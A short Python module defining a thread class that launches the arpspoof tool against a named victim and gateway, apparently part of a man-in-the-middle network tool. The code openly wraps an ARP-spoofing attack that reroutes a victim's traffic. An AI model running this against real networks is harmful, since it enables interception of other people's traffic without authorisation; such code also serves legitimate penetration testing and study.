from subprocess import DEVNULL
from subprocess import STDOUT
from subprocess import Popen
from threading import Thread
from tools.config_manager import SYS_NAME


class ArpSpoofThread(Thread):
    def __init__(self, victim, gateway, working_interface=None):
        Thread.__init__(self)
        self.victim = victim
        self.gateway = gateway
        self.working_interface = working_interface
        self.process = None
        self.terminated = False
        self.is_running = False
        self.ended_unexpectedly = False

    def run(self):
        self.is_running = True
        if SYS_NAME == "nt":
            self.process = Popen(["arpspoof.exe", self.victim], stdout=DEVNULL, stderr=STDOUT)
        else:
            self.process = Popen(["arpspoof", "-i", self.working_interface, "-t", self.victim, self.gateway],
                                 stdout=DEVNULL, stderr=STDOUT)
        self.process.wait()
        #
        # If arpspoof cannot start or somehow stopped, next code will be reached
        #
        if not self.terminated:
            self.ended_unexpectedly = True

    def stop(self):
        self.terminated = True
        self.process.terminate()
